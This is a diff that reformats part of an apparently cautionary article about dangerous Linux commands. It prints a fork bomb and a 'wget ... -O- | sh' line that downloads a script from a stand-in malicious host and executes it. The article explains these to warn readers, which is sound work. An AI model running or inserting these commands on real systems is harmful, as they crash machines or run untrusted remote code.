@@ -28,7 +28,7 @@ Note, these days on most Linux systems if you tried doing this you’d get a war
    
 This command is actually a fork bomb. It operates by defining a function called ‘:‘, which calls itself twice, once in the foreground and once in the background. It keeps on executing again and again till the system freezes.
    
-> :(){:|:&};:
+``` :(){:|:&};: ```
 
 This fork bomb command defines a function named : that recursively calls itself twice when executed. One of the recursive calls happens in the foreground while the other happens in the background.
    
@@ -91,7 +91,7 @@ If the above commands aren’t important here. What is important is that running
 
 Here’s an innocent command that can actually be useful in day-to-day life on a Linux system. **wget** retrieves the contents of a web URL, which can be used to access websites or download files. However, there’s a simple trick that turns it dangerous:
 
-> wget http://an-untrusted-url -O- | sh
+> wget http://an-untrusted-url -O- \| sh
  
 
 **wget http://malicious_source -O- | sh** command will download a script from a malicious source and then execute it. Wget command will download the script and sh will execute the downloaded script.The above combination downloads the contents of the given URL and immediately feeds it to the **sh** command, which executes the downloaded contents in the terminal. If the URL were to point to a malicious script, you’d be sealing your own fate with this command.
